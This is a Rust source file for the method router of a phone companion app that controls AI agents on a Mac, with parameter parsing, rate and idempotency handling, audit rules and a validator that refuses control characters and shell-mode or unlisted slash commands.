//! `method` → command function.
//!
//! The router owns what is the phone's alone: parameter parsing, Remote
//! Access's text refusals, the idempotent send, the rate limit and the audit
//! line. Everything else is the [`Backend`], whose desktop implementation
//! calls the same command functions the Agents view does, so the phone gets
//! the desk's emits, badge refresh and "Always allow" covering pass for free.

use async_trait::async_trait;
use serde::Deserialize;
use serde_json::{json, Value};
use std::collections::HashMap;
use std::sync::{Arc, Mutex};

use super::wire::{MacStatus, ProtocolCode, WireError};
use super::{actor_for, now_ms, Companion};
use crate::errors::CommandError;

/// What this Mac serves. `welcome.methods` lists exactly these, so the app
/// hides everything else.
pub const METHODS: &[&str] = &[
    "system.status",
    "devices.self",
    "devices.unpairSelf",
    "devices.setPush",
    "agents.overview",
    "agents.messages",
    "agents.send",
    "agents.stop",
    "agents.interrupt",
    "agents.stopStep",
    "agents.checkOn",
    "agents.answerApproval",
    "agents.saveSecret",
    "agents.loginStart",
    "agents.loginCancel",
    "agents.loginDecline",
    "agents.loginSaveKey",
    "agents.reach",
    "agents.policy",
    "agents.loginsTeam",
    "agents.loginsConnect",
    "agents.loginDismiss",
    "agents.loginNotNeeded",
    "agents.loginsNotNeeded",
    "agents.loginsUndecline",
    "agents.loginsRecheck",
    "agents.loginPhoneBegin",
    "agents.loginPhoneFinish",
    "agents.signinBegin",
    "agents.signinFrame",
    "agents.signinInput",
    "agents.signinDone",
    "agents.signinStop",
    "agents.focus",
    "agents.markUnread",
    "agents.startFresh",
    "agents.create",
    "agents.templates",
    "agents.update",
    "agents.setDefaults",
    "agents.setIndependence",
    "agents.setImportChoice",
    "agents.setAdmin",
    "agents.revokePermission",
    "agents.instructions",
    "agents.memory",
    "agents.memoryChange",
    "agents.memorySuggest",
    "agents.usage",
    "agents.quota",
    "agents.accounts",
    "agents.usagePlan",
    "agents.changeDiff",
    "agents.keepCopy",
    "agents.discardCopy",
    "agents.watchLive",
    "agents.files",
    "agents.fetchPath",
    "agents.search",
    "agents.schedule.preview",
    "agents.schedule.create",
    "agents.schedule.update",
    "agents.schedule.pause",
    "agents.schedule.cancel",
    "agents.schedule.runNow",
    "rooms.list",
    "rooms.messages",
    "rooms.send",
    "rooms.focus",
    "projects.list",
    "sessions.read",
    "sessions.send",
    "sessions.key",
    "sessions.start",
    "preview.screenshot",
    "agents.import.status",
    "agents.import.start",
    "agents.import.stop",
    "agents.import.review",
    "agents.teamSetup",
    "agents.teamSetup.step",
    "agents.teamSetup.routine",
    "agents.teamSetup.hello",
    "agents.teamSetup.missing",
    "agents.teamSetup.dismiss",
    "agents.teamSetup.later",
    "agents.teamSetup.check",
];

/// `READ_ONLY_METHODS` in methods.ts (the served subset): not audited.
pub const READ_ONLY_METHODS: &[&str] = &[
    "system.status",
    "devices.self",
    "agents.overview",
    "agents.messages",
    "agents.instructions",
    "agents.memory",
    "agents.reach",
    "agents.policy",
    "agents.loginsTeam",
    "agents.usage",
    "agents.quota",
    "agents.accounts",
    "agents.usagePlan",
    "agents.import.status",
    "agents.teamSetup",
    "agents.templates",
    "agents.changeDiff",
    "agents.files",
    "agents.search",
    "agents.schedule.preview",
    "rooms.list",
    "rooms.messages",
    "projects.list",
    "sessions.read",
];

/// Signing in on the Mac from the phone (`agents/phone_signin.rs`): never
/// audited by the router. Frames and inputs aren't audited at all (what's
/// typed is a password); the session writes its own line, the domain and
/// how it ended.
pub const SELF_AUDITED_METHODS: &[&str] = &[
    "agents.signinBegin",
    "agents.signinFrame",
    "agents.signinInput",
    "agents.signinDone",
    "agents.signinStop",
];

/// How long a `clientId` is remembered.
const SEND_MEMORY_MS: u64 = 24 * 60 * 60 * 1000;
const SEND_MEMORY_MAX: usize = 10_000;
const MESSAGES_DEFAULT: usize = 400;
const MESSAGES_MAX: usize = 1_000;

/// A staged upload handed to `agents_send` as a file on disk, so the desk's
/// own `attachments::save` copies it in.
#[derive(Debug, Clone, PartialEq)]
pub struct Staged {
    pub name: String,
    pub path: std::path::PathBuf,
}

/// What `agents.send` carries besides the text.
#[derive(Debug, Clone, Default, PartialEq)]
pub struct SendExtras {
    pub mentions: Vec<String>,
    pub attachments: Vec<Staged>,
    pub client_id: Option<String>,
    /// "Ask for changes": the result this message asks to revise.
    pub revises: Option<String>,
}

/// What `rooms.send` carries besides the room and the text.
#[derive(Debug, Clone, Default, PartialEq)]
pub struct RoomSend {
    /// Agent ids the user @mentioned.
    pub mentions: Vec<String>,
    /// `@everyone`: every member answers.
    pub everyone: bool,
    pub client_id: Option<String>,
}

/// The schedule commands, one variant each.
#[derive(Debug, Clone, PartialEq)]
pub enum ScheduleOp {
    Preview {
        when: String,
    },
    Create {
        agent_id: String,
        when: String,
        note: String,
    },
    Update {
        agent_id: String,
        id: String,
        when: String,
        note: String,
    },
    Pause {
        agent_id: String,
        id: String,
        paused: bool,
    },
    Cancel {
        agent_id: String,
        id: String,
    },
    RunNow {
        agent_id: String,
        id: String,
    },
}

impl ScheduleOp {
    /// The routine it acts on, when it names one.
    pub fn target(&self) -> Option<(&str, &str)> {
        match self {
            ScheduleOp::Update { agent_id, id, .. }
            | ScheduleOp::Pause { agent_id, id, .. }
            | ScheduleOp::Cancel { agent_id, id }
            | ScheduleOp::RunNow { agent_id, id } => Some((agent_id, id)),
            ScheduleOp::Preview { .. } | ScheduleOp::Create { .. } => None,
        }
    }
}

/// What the phone may change about an agent: the row's own toggles, its
/// instructions (the agent sheet shows them, so it can correct them), and
/// how it looks (`avatar` and `color`, from a Mac that lists
/// [`MAC_FEATURE_LOOKS`](super::wire::MAC_FEATURE_LOOKS)). Its name, role,
/// model and project stay the desk's.
#[derive(Debug, Clone, Default, PartialEq, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct AgentToggles {
    pub pinned: Option<bool>,
    pub hidden: Option<bool>,
    pub muted: Option<bool>,
    pub instructions: Option<String>,
    #[serde(default)]
    pub avatar: Option<crate::agents::store::AgentLook>,
    #[serde(default)]
    pub color: Option<String>,
}

/// Instructions are a brief, not a document: the phone's editor stops here.
const MAX_INSTRUCTIONS: usize = 20_000;

/// What the phone may set on a new agent: what it should do, its name and
/// its colour, and optionally the ready-made agent it starts from (whose
/// briefing then becomes its instructions). Everything else is the desk's
/// create path's own default: the engine the desk would pick, the engine's
/// own model, no project, and no instructions beyond the role or template
/// (the agent sheet edits those afterwards).
#[derive(Debug, Clone, Default, PartialEq, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct PhoneNewAgent {
    pub name: String,
    #[serde(default)]
    pub role: String,
    #[serde(default)]
    pub color: Option<String>,
    /// Its shape and face, as the phone's preview showed them.
    #[serde(default)]
    pub avatar: Option<crate::agents::store::AgentLook>,
    /// An id from `agents.templates`.
    #[serde(default)]
    pub template: Option<String>,
}

/// "What should it do?" is one line, as the desk's field is.
const MAX_ROLE: usize = 500;
/// `store::validate_name`'s limit, checked here too so the refusal is the phone's.
const MAX_NAME: usize = 40;

/// The desk's editor starts a new agent on the first colour nobody wears
/// yet, leaving white and gray for the user to pick (`freeColor` in
/// AgentEditorModal.tsx). Purple when every colour is taken.
pub fn free_color(taken: &[String]) -> &'static str {
    crate::agents::store::COLORS
        .iter()
        .copied()
        .find(|c| *c != "white" && *c != "gray" && !taken.iter().any(|t| t == c))
        .unwrap_or("purple")
}

/// `agents.templates`: each ready-made agent as the phone's New agent sheet
/// offers it.
fn templates_for_phone() -> Value {
    Value::Array(
        crate::agents::templates::all()
            .iter()
            .map(|t| {
                serde_json::json!({
                    "id": t.id,
                    "title": t.title,
                    "name": t.name,
                    "role": t.role,
                    "color": t.color,
                    "needs": t.needs,
                })
            })
            .collect(),
    )
}

/// A name and a role, checked and tidied: one line each, no control
/// characters, within the desk's limits, and a colour the desk draws.
fn check_new_agent(input: PhoneNewAgent) -> Result<PhoneNewAgent, WireError> {
    let one_line = |s: &str| s.split_whitespace().collect::<Vec<_>>().join(" ");
    if input
        .name
        .chars()
        .chain(input.role.chars())
        .any(|c| c.is_control() && !c.is_whitespace())
    {
        return Err(WireError::protocol(
            ProtocolCode::Refused,
            "A name or role can't contain control characters.",
        ));
    }
    let name = one_line(&input.name);
    let role = one_line(&input.role);
    if name.is_empty() {
        return Err(bad_params("Give the agent a name."));
    }
    if name.chars().count() > MAX_NAME {
        return Err(bad_params(format!(
            "Keep the name under {MAX_NAME} characters."
        )));
    }
    if role.chars().count() > MAX_ROLE {
        return Err(bad_params(format!(
            "Say what it should do in under {MAX_ROLE} characters. The rest can go in its instructions."
        )));
    }
    let color = match input.color.as_deref().map(str::trim) {
        None | Some("") => None,
        Some(c) if crate::agents::store::COLORS.contains(&c) => Some(c.to_string()),
        Some(c) => return Err(bad_params(format!("{c} isn't one of the agent colours."))),
    };
    let template = match input.template.as_deref().map(str::trim) {
        None | Some("") => None,
        Some(id) => match crate::agents::templates::find(id) {
            Some(t) => Some(t.id.clone()),
            None => {
                return Err(bad_params(format!(
                    "{id} isn't one of the ready-made agents."
                )))
            }
        },
    };
    Ok(PhoneNewAgent {
        name,
        role,
        color,
        avatar: check_look(input.avatar)?,
        template,
    })
}

/// A look the phone sent: keys this Mac draws, or a refusal naming them.
fn check_look(
    look: Option<crate::agents::store::AgentLook>,
) -> Result<Option<crate::agents::store::AgentLook>, WireError> {
    look.map(|l| crate::agents::store::AgentLook::checked(&l.shape, &l.face))
        .transpose()
        .map_err(bad_params)
}

/// "Setting up your team" from the phone (`agents::team_setup`): the same
/// commands the desk's card calls.
#[derive(Debug, Clone, PartialEq)]
pub enum TeamSetupAction {
    /// The checklist (`any` brings back one put away).
    Get {
        any: bool,
    },
    Step {
        step: crate::agents::team_setup::StepId,
        state: crate::agents::team_setup::StepState,
    },
    Routine {
        agent_id: String,
        check_in_id: String,
        on: bool,
    },
    /// "Say hi": the user's hello, which wakes that one agent.
    Hello {
        agent_id: String,
    },
    /// Everything they said they're missing, to the Chief in one message.
    Missing,
    Dismiss,
    /// A row nothing reached: `connect` (one sign-in card, its way in
    /// started on the Mac) or `not_needed`.
    Later {
        key: String,
        connect: bool,
        on_phone: bool,
    },
    /// Check again what the team can already reach.
    Check,
}

#[derive(Debug, Clone, PartialEq)]
pub struct ApprovalAnswer {
    pub agent_id: String,
    pub request_id: String,
    pub allow: bool,
    pub always: Option<bool>,
    pub note: Option<String>,
    /// On a session's question: the option picked, by index.
    pub choice: Option<usize>,
}

/// A memory entry is a line worth keeping, not a document.
const MAX_MEMORY_CHARS: usize = 2_000;
/// "Remember this" summarises one message; longer is cut, as on the desk.
const MAX_SUGGEST_CHARS: usize = 20_000;
/// A secret's parts: a username and password is the most a card asks for.
const MAX_SECRET_FIELDS: usize = 8;
const MAX_SECRET_CHARS: usize = 8_192;

/// Everything outside the companion it needs: the agents, the Mac, the
/// audit log and the Phone panel. The desktop implementation is in
/// `desktop.rs`; tests use a stub agent.
#[async_trait]
pub trait Backend: Send + Sync + 'static {
    /// The host names `tailscale serve` publishes this Mac on, as
    /// `identity::host_of` reads them: what the Mac signs before a phone
    /// sends anything secret, so the phone can tell it reached the Mac
    /// itself and not something relaying it.
    fn serve_hosts(&self) -> Vec<String>;
    async fn overview(&self) -> Result<Value, CommandError>;
    /// A page of messages, oldest first, ending just before `before` (or at
    /// the newest). The flag: older ones exist.
    async fn messages(
        &self,
        agent_id: &str,
        limit: usize,
        before: Option<&str>,
    ) -> Result<(Vec<Value>, bool), CommandError>;
    async fn send(
        &self,
        agent_id: &str,
        text: String,
        extras: SendExtras,
    ) -> Result<Value, CommandError>;
    async fn stop(&self, agent_id: &str) -> Result<bool, CommandError>;
    async fn interrupt(&self, agent_id: &str) -> Result<bool, CommandError>;
    /// "Stop this step" (`agents_stop_step`): what it did, in words.
    async fn stop_step(&self, agent_id: &str) -> Result<String, CommandError>;
    /// "Check on it" (`agents_check_on`): what the Mac sees, in one line.
    async fn check_on(&self, agent_id: &str) -> Result<String, CommandError>;
    async fn answer_approval(&self, answer: ApprovalAnswer) -> Result<(), CommandError>;
    /// `agents_focus` for a socket instead of a window.
    async fn focus(&self, label: &str, agent_id: Option<String>) -> Result<(), CommandError>;
    async fn mark_unread(&self, agent_id: &str) -> Result<(), CommandError>;
    /// `agents_start_fresh`: a new conversation, memory kept. Returns the
    /// stored agent.
    async fn start_fresh(&self, agent_id: &str) -> Result<Value, CommandError>;
    /// `agents_create` with what the phone may set, on the engine the desk
    /// would pick (`engine::default_for`) and a free colour when none was
    /// picked. Returns the stored agent.
    async fn create_agent(&self, input: PhoneNewAgent) -> Result<Value, CommandError>;
    /// `agents_update` with only the toggles set; returns the stored agent.
    async fn update_agent(
        &self,
        agent_id: &str,
        toggles: AgentToggles,
    ) -> Result<Value, CommandError>;
    /// `agents_save_secret`: a secure input card's values into the Keychain.
    /// Returns the saved `AgentSecret` (never a value).
    async fn save_secret(
        &self,
        agent_id: &str,
        request_id: &str,
        values: Vec<String>,
    ) -> Result<Value, CommandError>;
    /// `agents_memory`: the agent's memory entries.
    async fn memory(&self, agent_id: &str) -> Result<Value, CommandError>;
    /// `agents_memory_change`: add, edit or delete one entry.
    async fn memory_change(&self, agent_id: &str, change: Value) -> Result<Value, CommandError>;
    /// `agents_memory_suggest`: a message as one line worth keeping.
    async fn memory_suggest(&self, text: String) -> Result<String, CommandError>;
    /// `agents_instructions`: the agent's brief, as the Edit agent sheet shows it.
    async fn instructions(&self, agent_id: &str) -> Result<String, CommandError>;
    /// `agents_usage`: this week and all time.
    async fn usage(&self, agent_id: &str) -> Result<Value, CommandError>;
    /// `agents_set_defaults`: what new agents start on (Settings → Agents).
    /// Checked as the desk checks it: a ready engine, a model it offers.
    async fn set_defaults(
        &self,
        change: crate::agents::defaults::Change,
    ) -> Result<Value, CommandError>;
    /// `agents_set_independence`: how much agents do on their own. Changes
    /// what they're told, never what asks for the user's OK.
    async fn set_independence(
        &self,
        level: crate::agents::independence::Level,
    ) -> Result<Value, CommandError>;
    /// `agents_set_import_choice`: "bring your agents, or start fresh?"
    /// answered from the phone (its home card). Additive: newer Macs only.
    async fn set_import_choice(
        &self,
        choice: crate::agents::import_choice::Choice,
    ) -> Result<Value, CommandError>;
    /// `agents_set_admin`: the user's own switch, "Admin — can manage and
    /// approve for other agents". Answers `{ agentId, admin }`.
    async fn set_admin(&self, agent_id: &str, admin: bool) -> Result<Value, CommandError>;
    /// `agents_quota`: each engine's plan, as it last reported it.
    async fn quota(&self) -> Result<Value, CommandError>;
    /// `agents_accounts`: each engine's usage accounts, read-only.
    async fn accounts(&self) -> Result<Value, CommandError>;
    /// `agents_usage_overview`: the capacity inventory, read-only.
    async fn usage_plan(&self) -> Result<Value, CommandError>;
    /// An import from another assistant, as the phone follows it: whether
    /// this Mac's Remote access is on and has been reached, whether an import
    /// may begin, the one going on, and the message to send. Never the link:
    /// it's a key, and only the Mac copies it (`remote_access` "Security").
    async fn import_status(&self) -> Result<Value, CommandError>;
    /// Start: one import may begin (`connector::arm`). It still asks on a
    /// card in the Chief's chat first.
    async fn import_start(&self) -> Result<Value, CommandError>;
    /// Stop the import (`connector::stop`).
    async fn import_stop(&self) -> Result<Value, CommandError>;
    /// Import from a review card, from the phone: the kept agents come in as
    /// new agents (a taken name as a copy), never replacing one here, with no
    /// notes added to the Chief. Replace stays on the Mac, where its diff and
    /// consequences are on screen.
    async fn import_review(
        &self,
        agent_id: &str,
        request_id: &str,
        keys: Vec<String>,
    ) -> Result<Value, CommandError>;
    /// "Setting up your team": `agents_team_setup*`. `Get` answers the
    /// checklist or `null`; `Hello` and `Missing` the message they sent;
    /// the rest `null`.
    async fn team_setup(&self, action: TeamSetupAction) -> Result<Value, CommandError>;
    /// `agents_revoke_permission`: an "Always allow" rule taken back.
    async fn revoke_permission(&self, agent_id: &str, rule_id: &str) -> Result<(), CommandError>;
    /// `agents_login_start`: one of a login card's ways in, started on this
    /// Mac (its browser opens here; the token is made and kept here). The
    /// card follows it on both devices.
    async fn login_start(
        &self,
        agent_id: &str,
        request_id: &str,
        option_id: &str,
        on_phone: bool,
    ) -> Result<(), CommandError>;
    /// `login_relay::begin`: a phone sign-in sheet's URL, the PKCE verifier
    /// and `state` kept on this Mac, bound to `device_id`.
    async fn login_phone_begin(
        &self,
        device_id: &str,
        target: crate::agents::login_relay::Target,
        option_id: &str,
    ) -> Result<Value, CommandError>;
    /// `login_relay::finish`: the sheet's one-time code, from the device
    /// that started it, exchanged and kept here.
    async fn login_phone_finish(
        &self,
        device_id: &str,
        flow_id: &str,
        callback: &str,
    ) -> Result<(), CommandError>;
    /// Signing in on this Mac's Chrome from the phone
    /// (`agents/phone_signin.rs`), for the paired device calling.
    async fn phone_signin(
        &self,
        device_id: &str,
        device_name: &str,
        op: crate::agents::phone_signin::Op,
    ) -> Result<Value, CommandError>;
    /// `agents_login_cancel`: stop a sign-in under way.
    async fn login_cancel(&self, agent_id: &str, request_id: &str) -> Result<(), CommandError>;
    /// `agents_login_decline`.
    async fn login_decline(
        &self,
        agent_id: &str,
        request_id: &str,
        note: Option<String>,
    ) -> Result<(), CommandError>;
    /// `agents_login_save_key`: a login card's API key into the Keychain.
    async fn login_save_key(
        &self,
        agent_id: &str,
        request_id: &str,
        value: String,
    ) -> Result<Value, CommandError>;
    /// `agents_reach`: what an agent can reach. Read-only on the phone.
    async fn reach(&self, agent_id: &str) -> Result<Value, CommandError>;
    /// `agents_policy`: "What it can do". Read-only on the phone; changed in chat.
    async fn policy(&self, agent_id: &str) -> Result<Value, CommandError>;
    /// `agents_logins_team`: "What your team needs", one row per service.
    async fn logins_team(&self, since: Option<i64>) -> Result<Value, CommandError>;
    /// `agents_logins_connect`: one row's way in, for every agent on it but `skip`.
    async fn logins_connect(
        &self,
        key: &str,
        option_id: &str,
        skip: Vec<String>,
        on_phone: bool,
    ) -> Result<(), CommandError>;
    /// `agents_login_dismiss`: put one agent's card away.
    async fn login_dismiss(&self, agent_id: &str, request_id: &str) -> Result<(), CommandError>;
    /// `agents_login_not_needed`: the card's service, declined for the team
    /// and remembered. The receipt (`keys`, `line`, `closed`).
    async fn login_not_needed(
        &self,
        agent_id: &str,
        request_id: &str,
    ) -> Result<Value, CommandError>;
    /// `agents_logins_not_needed`: rows of "What your team needs", or every
    /// row still waiting ("Skip the rest") when `keys` is `None`.
    async fn logins_not_needed(&self, keys: Option<Vec<String>>) -> Result<Value, CommandError>;
    /// `agents_logins_undecline`: Undo, or turn back on. How many cards came back.
    async fn logins_undecline(&self, keys: Vec<String>) -> Result<Value, CommandError>;
    /// `agents_logins_recheck`: the user is back; check claude.ai connectors now.
    async fn logins_recheck(&self) -> Result<(), CommandError>;
    /// `agents_change_diff`: one file of a change card.
    async fn change_diff(
        &self,
        agent_id: &str,
        message_id: &str,
        path: &str,
    ) -> Result<Value, CommandError>;
    /// `agents_copy_keep`: the agent's copy of its project, kept. Returns
    /// `Kept` (`{outcome: kept|nothing|conflict}`).
    /// `into` names the project's current branch when the user confirmed
    /// keeping there after an `otherBranch` answer.
    async fn keep_copy(
        &self,
        agent_id: &str,
        copy_id: &str,
        into: Option<&str>,
    ) -> Result<Value, CommandError>;
    /// `agents_copy_discard`: the agent's copy of its project, discarded.
    async fn discard_copy(&self, agent_id: &str, copy_id: &str) -> Result<(), CommandError>;
    /// `agents_files`: everything shared in one conversation, newest first.
    async fn files(&self, agent_id: &str) -> Result<Value, CommandError>;
    /// A path from an agent's reply, resolved as `share_file` resolves it
    /// (its home and the user's projects; folders refused).
    async fn shareable_path(
        &self,
        agent_id: &str,
        path: &str,
    ) -> Result<std::path::PathBuf, CommandError>;
    async fn search(&self, query: String) -> Result<Value, CommandError>;
    async fn schedule(&self, op: ScheduleOp) -> Result<Value, CommandError>;
    /// `agents_rooms`: every room, with what is happening in it now.
    async fn rooms(&self) -> Result<Value, CommandError>;
    /// A page of a room's thread, oldest first, ending just before `before`.
    /// The flag: older lines exist.
    async fn room_messages(
        &self,
        room_id: &str,
        limit: usize,
        before: Option<&str>,
    ) -> Result<(Vec<Value>, bool), CommandError>;
    /// `agents_room_send`: returns `{message, asked}`.
    async fn room_send(
        &self,
        room_id: &str,
        text: String,
        send: RoomSend,
    ) -> Result<Value, CommandError>;
    /// `agents_room_focus` for a socket instead of a window.
    async fn room_focus(&self, label: &str, room_id: Option<String>) -> Result<(), CommandError>;
    /// Every project as `ProjectSummary[]`.
    async fn projects(&self) -> Result<Value, CommandError>;
    /// One agent tab's screen as a `SessionScreen`.
    async fn session_screen(&self, session_id: &str) -> Result<Value, CommandError>;
    /// Type cleaned `text` into an agent tab of `project` (the given one, or
    /// the live one that printed last) and press Enter, with Remote
    /// Access's refusals. Returns the tab's session id.
    async fn session_send(
        &self,
        project: &str,
        session_id: Option<&str>,
        text: &str,
    ) -> Result<String, CommandError>;
    /// Press `key` (already one `key_bytes` knows) in an agent tab.
    async fn session_key(&self, session_id: &str, key: &str) -> Result<(), CommandError>;
    /// Open a new agent tab in `project` that starts on cleaned `prompt`
    /// (Remote Access's `start_agent`). Returns its session id once the tab exists.
    async fn session_start(&self, project: &str, prompt: &str) -> Result<String, CommandError>;
    /// The project's live preview as a JPEG, captured for the phone alone.
    async fn preview_screenshot(&self, project: &str, phone: bool)
        -> Result<Vec<u8>, CommandError>;
    /// "Watch live": the port of the running dev server a card previews
    /// (`preview_test::resolve`), refused when nothing is serving it.
    async fn watch_port(
        &self,
        agent_id: &str,
        message_id: &str,
        link: Option<usize>,
    ) -> Result<(String, u16), CommandError>;
    /// Publish the watch proxy on the tailnet (lazily, once): its base URL.
    async fn watch_publish(&self) -> Result<String, CommandError>;
    /// An attachment's file: `attachments::resolve` under the agent's home.
    fn attachment_file(
        &self,
        agent_id: &str,
        rel: &str,
    ) -> Result<std::path::PathBuf, CommandError>;
    async fn mac_status(&self) -> MacStatus;
    fn server_name(&self) -> String;
    fn app_version(&self) -> String;
    fn audit(&self, actor: &str, tool: &str, detail: String, ok: bool);
    /// Something the Phone panel shows changed (a pair request, a connect).
    fn changed(&self);
}

/// `clientId` → the message that send produced, for 24 hours. Concurrent
/// retries wait on the first; a failed send isn't remembered, so it can be
/// tried again.
#[derive(Default)]
pub struct SendCache {
    map: Mutex<HashMap<String, Sent>>,
}

/// When a `clientId` was first seen, and its send's result once it has one.
type Sent = (u64, Arc<tokio::sync::OnceCell<Value>>);

impl SendCache {
    pub async fn once<F, Fut>(&self, key: String, now: u64, send: F) -> Result<Value, WireError>
    where
        F: FnOnce() -> Fut,
        Fut: std::future::Future<Output = Result<Value, WireError>>,
    {
        let cell = {
            let mut map = self.map.lock().unwrap_or_else(|e| e.into_inner());
            map.retain(|_, (at, _)| now.saturating_sub(*at) < SEND_MEMORY_MS);
            if map.len() >= SEND_MEMORY_MAX {
                if let Some(oldest) = map
                    .iter()
                    .min_by_key(|(_, (at, _))| *at)
                    .map(|(k, _)| k.clone())
                {
                    map.remove(&oldest);
                }
            }
            map.entry(key)
                .or_insert_with(|| (now, Arc::new(tokio::sync::OnceCell::new())))
                .1
                .clone()
        };
        cell.get_or_try_init(send).await.cloned()
    }
}

/// Who is calling: one socket of one paired device.
#[derive(Debug, Clone)]
pub struct Caller {
    pub device_id: String,
    pub device_name: String,
    /// `notify::set_showing`'s key for this socket.
    pub label: String,
    /// How this socket reached the Mac. Today always `Tailscale`: the
    /// listener is loopback-only and `tailscale serve` is the one way in.
    /// It is a label, not a check. What keeps a secret from going to the
    /// wrong server is the phone's: it sends one only on a socket whose
    /// `welcome` was signed by the identity key it pinned at pairing.
    pub route: super::wire::RouteKind,
    /// What its app said it shows (`hello.features`).
    pub shows: super::wire::Shows,
}

/// Remote Access's refusals for text that becomes an agent's words later
/// (its instructions, a routine's note): no control characters but newline
/// and tab, no leading `!` (Claude Code's shell mode) and no `/` command
/// outside the allowlist. Refused rather than cleaned, so what's saved is
/// what the person wrote. Empty text is left to the caller.
fn refuse_unsafe_text(text: &str, what: &str) -> Result<(), WireError> {
    if text
        .chars()
        .any(|c| c.is_control() && c != '\n' && c != '\t' && c != '\r')
    {
        return Err(WireError::protocol(
            ProtocolCode::Refused,
            format!("{what} can't contain control characters."),
        ));
    }
    if text.trim().is_empty() {
        return Ok(());
    }
    crate::remote_access::tools::check_message_kind(text)
        .map_err(|reason| WireError::protocol(ProtocolCode::Refused, reason))
}

fn bad_params(e: impl std::fmt::Display) -> WireError {
    WireError::protocol(ProtocolCode::BadParams, e.to_string())
}

fn parse<T: for<'de> Deserialize<'de>>(params: Value) -> Result<T, WireError> {
    // `{}` and an absent params object are the same thing.
    let params = if params.is_null() { json!({}) } else { params };
    serde_json::from_value(params).map_err(bad_params)
}

/// `devices.setPush`: a token, or `null` to stop.
#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct SetPushParams {
    token: Option<String>,
    #[serde(default)]
    environment: Option<super::push::PushEnvironment>,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct AgentParam {
    agent_id: String,
}

#[derive(Deserialize, Default)]
#[serde(rename_all = "camelCase")]
struct TeamSetupGetParams {
    #[serde(default)]
    any: bool,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct TeamSetupStepParams {
    step: crate::agents::team_setup::StepId,
    state: crate::agents::team_setup::StepState,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct TeamSetupLaterParams {
    key: String,
    action: String,
    #[serde(default)]
    on_phone: bool,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct TeamSetupRoutineParams {
    agent_id: String,
    check_in_id: String,
    on: bool,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct ImportReviewParams {
    agent_id: String,
    request_id: String,
    keys: Vec<String>,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct MessagesParams {
    agent_id: String,
    limit: Option<usize>,
    before: Option<String>,
}

#[derive(Deserialize)]
struct BlobParam {
    #[serde(rename = "blobId")]
    blob_id: String,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct PathParams {
    agent_id: String,
    path: String,
}

#[derive(Deserialize)]
struct QueryParams {
    query: String,
}

#[derive(Deserialize)]
struct WhenParams {
    when: String,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct ScheduleParams {
    agent_id: String,
    #[serde(default)]
    id: String,
    #[serde(default)]
    when: String,
    #[serde(default)]
    note: String,
    #[serde(default)]
    paused: bool,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct SessionParams {
    session_id: String,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
struct CreateParams {
    input: PhoneNewAgent,
    #[serde(default)]
    client_id: Option<String>,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct UpdateParams {
    agent_id: String,
    input: AgentToggles,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct SessionSendParams {
    project: String,
    session_id: Option<String>,
    text: String,
    client_id: String,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct LoginParams {
    agent_id: String,
    request_id: String,
    #[serde(default)]
    option_id: String,
    #[serde(default)]
    note: Option<String>,
    /// The sign-in is on the phone (claude.ai there, a device code), so the
    /// Mac doesn't open its own browser. Older phones omit it.
    #[serde(default)]
    on_phone: bool,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct PhoneBeginParams {
    option_id: String,
    #[serde(default)]
    agent_id: Option<String>,
    #[serde(default)]
    request_id: Option<String>,
    /// A team row instead of one card.
    #[serde(default)]
    key: Option<String>,
    #[serde(default)]
    skip: Vec<String>,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct SigninBeginParams {
    agent_id: String,
    request_id: String,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct SigninParams {
    session_id: String,
    #[serde(default)]
    anyway: bool,
}

/// `Debug` is `Input`'s: never what was typed.
#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct SigninInputParams {
    session_id: String,
    input: crate::agents::phone_signin::Input,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct PhoneFinishParams {
    flow_id: String,
    /// The redirect the sign-in sheet came back with. Never logged.
    callback_url: String,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct TeamParams {
    #[serde(default)]
    since: Option<i64>,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct DeclineParams {
    #[serde(default)]
    keys: Option<Vec<String>>,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct TeamConnectParams {
    key: String,
    option_id: String,
    #[serde(default)]
    skip: Vec<String>,
    #[serde(default)]
    on_phone: bool,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct LoginKeyParams {
    agent_id: String,
    request_id: String,
    value: String,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct RuleParams {
    agent_id: String,
    rule_id: String,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct DiffParams {
    agent_id: String,
    message_id: String,
    path: String,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct WatchParams {
    agent_id: String,
    message_id: String,
    /// One of the message's local links (`watch.links`), not the card.
    #[serde(default)]
    link: Option<usize>,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct CopyParams {
    agent_id: String,
    copy_id: String,
    /// Keep: the branch the user confirmed, after `otherBranch`.
    #[serde(default)]
    into: Option<String>,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct SessionStartParams {
    project: String,
    prompt: String,
    client_id: String,
}

#[derive(Deserialize)]
struct ScreenshotParams {
    project: String,
    device: ScreenshotDevice,
}

#[derive(Deserialize)]
#[serde(rename_all = "lowercase")]
enum ScreenshotDevice {
    Desktop,
    Phone,
}

